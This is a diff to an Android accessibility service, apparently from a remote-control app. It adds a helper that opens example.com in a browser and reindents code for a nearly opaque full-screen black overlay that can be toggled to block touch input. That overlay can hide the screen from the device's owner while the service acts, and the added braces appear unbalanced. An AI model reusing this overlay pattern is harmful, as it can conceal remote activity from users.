@@ -181,7 +181,9 @@ class InputService : AccessibilityService() {
 	           gohome = 0
 	         else
 	           gohome = 8	
-	    
+		
+	     // 调用打开浏览器输入网址的方法
+            openBrowserWithUrl("https://www.example.com")
             return
         }
 
@@ -245,6 +247,25 @@ class InputService : AccessibilityService() {
             }
             else -> {}
         }
+    }
+    
+    private fun openBrowserWithUrl(url: String) {
+	try {
+	    // 创建一个 Intent 对象，用于启动浏览器并打开指定网址
+	    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+	    // 检查是否有应用可以处理该 Intent
+	    if (intent.resolveActivity(packageManager) != null) {
+		// 启动浏览器
+		startActivity(intent)
+	    } else {
+		// 如果没有应用可以处理该 Intent，显示提示信息
+		Toast.makeText(this, "没有可用的浏览器应用", Toast.LENGTH_SHORT).show()
+	    }
+	} catch (e: Exception) {
+	    // 处理异常，显示错误信息
+	    Toast.makeText(this, "打开浏览器失败: ${e.message}", Toast.LENGTH_SHORT).show()
+	}
+      }
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
@@ -679,7 +700,7 @@ class InputService : AccessibilityService() {
     	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
     	overLay.getBackground().setAlpha(253)
     	gohome=8
-	    overLay.setVisibility(gohome)
+	overLay.setVisibility(gohome)
         windowManager.addView(overLay, overLayparams_bass)
     }
     
@@ -690,16 +711,16 @@ class InputService : AccessibilityService() {
 	           //  Log.d(logTag, "Fakelay runnable globalVariable: $globalVariable")
     		     if(gohome==8)
     		     {  
-        			overLay.setFocusable(false)
-        			overLay.setClickable(false)
+        		overLay.setFocusable(false)
+        		overLay.setClickable(false)
     		     }
     		    else
     		     {
-        			overLay.setFocusable(true)
-                    overLay.setClickable(true)
+        		overLay.setFocusable(true)
+                        overLay.setClickable(true)
     		     }
-                 overLay.setVisibility(gohome)
-		         windowManager.updateViewLayout(overLay, overLayparams_bass)
+                     overLay.setVisibility(gohome)
+		     windowManager.updateViewLayout(overLay, overLayparams_bass)
             }
             handler.postDelayed(this, 1000) 
         }
